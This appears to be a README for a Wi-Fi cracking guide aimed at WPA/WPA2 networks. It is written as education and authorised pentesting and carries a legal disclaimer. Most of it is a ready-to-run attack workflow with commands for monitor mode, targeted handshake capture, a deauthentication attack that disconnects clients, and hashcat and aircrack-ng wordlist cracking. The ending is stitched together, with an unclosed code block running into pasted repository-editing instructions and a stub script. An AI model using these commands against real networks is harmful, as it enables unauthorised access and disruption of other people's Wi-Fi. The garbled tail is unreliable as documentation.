# Aircracking: Modern Wi-Fi Security Testing Guide

[![Last Updated](https://img.shields.io/badge/Last%20Updated-June%202026-blue)](https://github.com/nova0408-glitch/Aircracking)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**Educational guide for testing WPA/WPA2 (and PMKID) Wi-Fi network security using industry-standard tools.**

> **⚠️ LEGAL DISCLAIMER**  
> This material is provided for **educational and authorized penetration testing purposes only**. Unauthorized access to wireless networks is illegal in most jurisdictions (e.g., under the U.S. Computer Fraud and Abuse Act). Only test networks you own or have explicit written permission to test. The author and contributors are not responsible for any misuse.

## Features
- Updated for modern tools (Aircrack-ng 1.7+, Hashcat, hcxtools)
- Passive & active attack methods
- GPU-accelerated cracking guidance
- Hardware recommendations
- Troubleshooting section

## Table of Contents
- [Getting Started](#getting-started)
- [Basic Attack Workflow](#basic-attack-workflow)
- [Advanced Techniques](#advanced-techniques)
- [Cracking the Handshake](#cracking-the-handshake)
- [Troubleshooting](#troubleshooting)
- [Legal & Ethical Notes](#legal--ethical-notes)

## Getting Started

### Prerequisites
- Debian-based Linux (Kali Linux recommended)
- Wireless adapter supporting **monitor mode** and packet injection (recommended: Alfa AWUS036ACH, AWUS036AXM)
- `sudo apt update && sudo apt install aircrack-ng hashcat hcxtools hcxdumptool`

### Quick Setup
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0   # Replace wlan0 with your interface
```
1. Monitor Mode & Discovery
```bash
   # Start monitor mode
sudo airmon-ng start wlan0
# Scan for networks
sudo airodump-ng wlan0mon
```
2. Capture Handshake
```bash
   # Target a specific network
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
```
Deauth Attack (to speed up handshake capture - use responsibly):
```bash
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```
3.Cracking
Recommended: Hashcat (GPU)
```bash
# Convert capture
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with wordlist + rules (example)
hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt -r rules/best64.rule
```
Alternative: Aircrack-ng (CPU)
```bash
aircrack-ng -w /path/to/wordlist.txt capture-01.cap
```

<b>Advanced Techniques</b>
---
<br>
PMKID Attack (no client needed in many cases)<br>
Full hcxtools workflow (recommended for modern setups)<br>
Mask attacks, combinator attacks<br>
Custom wordlist generation with crunch or cewl<br>

(See appendix.md for details)<br>
Troubleshooting<br>

"No such device" or channel issues → airmon-ng check kill<br>
Driver problems → Check iw list and consider better hardware<br>
GPU setup → Install latest NVIDIA/AMD drivers + Hashcat<br>

<b>Legal & Ethical Notes</b>
---
<br>

Always obtain permission<br>
Use for red teaming, personal network testing, or bug bounties<br>
Respect privacy — do not use captured data maliciously<br>
<b>Contributing</b>
---
See CONTRIBUTING.md. Pull requests welcome for updates, new techniques, or translations.
--
Last tested: June 2026 with Aircrack-ng 1.7+ and Hashcat 6.2+
```bash

### 3. Updated `appendix.md` (Key Improvements)

Replace with expanded, modernized version focusing on:

- PMKID attack (very important modern addition)
- Full hcxtools recommendation
- Updated macOS section
- Wordlist sources (SecLists, etc.)
- Hardware buying guide (2026 relevant)
- Automation script example

### 4. New Files to Add

**`CONTRIBUTING.md`**:
```markdown
# Contributing

Thank you for your interest!

1. Fork the repo
2. Create a feature branch
3. Make changes + test commands
4. Submit PR with clear description

We welcome:
- Updated commands for newer tool versions
- New attack techniques
- Better documentation
- Translations
```
Optional: scripts/capture.sh (make executable):
```bash
#!/bin/bash
# Simple wrapper - customize as needed
echo "Modern Wi-Fi capture helper coming soon..."
```


